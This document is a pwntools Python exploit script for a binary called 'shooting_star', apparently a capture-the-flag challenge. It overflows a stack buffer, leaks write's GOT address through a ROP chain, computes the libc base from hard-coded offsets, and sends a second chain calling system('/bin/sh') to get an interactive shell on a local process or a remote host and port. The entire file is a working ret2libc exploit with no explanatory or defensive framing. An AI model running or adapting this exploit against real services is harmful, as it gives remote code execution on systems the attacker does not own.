from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:  
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  
        return process([exe] + argv, *a, **kw)


def find_ip(payload):
    p = process(exe)
    p.sendlineafter('>', '1')
    p.sendlineafter('>>', payload)
    p.wait() # wait for the process to crash

    # Print out the address of EIP/RIP at the time of crashing
    # ip_offset = cyclic_find(p.corefile.pc)  # x86
    ip_offset = cyclic_find(p.corefile.read(p.corefile.sp, 4))  # x64
    info('located EIP/RIP offset at {a}'.format(a=ip_offset))
    return ip_offset

exe = './shooting_star'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'debug'

## EXPLOITATION

paddingBytes = find_ip(cyclic(1024))

sh = start()
pop_rdi = 0x4012cb
pop_rsi_r15 = 0x4012c9  
info("%#x pop_rdi", pop_rdi) # format this into hex
info("%#x pop_rsi_r15", pop_rsi_r15) # format this into hex

payload = flat(
    {paddingBytes: [
        pop_rsi_r15,  # Pop the following value from stack into RSI
        elf.got.write,  # Address of write() in GOT
        0x0,  # Don't need anything in r15
        elf.plt.write,  # Call plt.write() to print address of got.write()
        elf.symbols.main  # Return to beginning of star function
    ]}
)

sh.sendlineafter('>', '1')
sh.sendlineafter('>>', payload)
sh.recvuntil('May your wish come true!\n') 
leaked_addr = sh.recv() # got the address printed out in hex
got_write = unpack(leaked_addr[:6].ljust(8, b"\x00"))
info("leaked got_write: %#x", got_write)

libc_base = got_write - 0x110210 #remote write offset | #0xf8180 - our write offset
info("libc_base: %#x", libc_base)

system_addr = libc_base +  0x04f550 # system offset | #0x4c330 - our system offset
info("system_addr: %#x", system_addr)

bin_sh = libc_base + 0x1b3e1a #remote bin/sh offset | #0x196031 - our bin/sh offset
info("bin_sh: %#x", bin_sh)

payload = flat(
    {paddingBytes: [
        pop_rdi,  
        bin_sh, 
        system_addr  
    ]}
)

sh.sendline('1')
sh.sendlineafter('>>', payload)
sh.recvuntil('May your wish come true!\n')

sh.interactive()
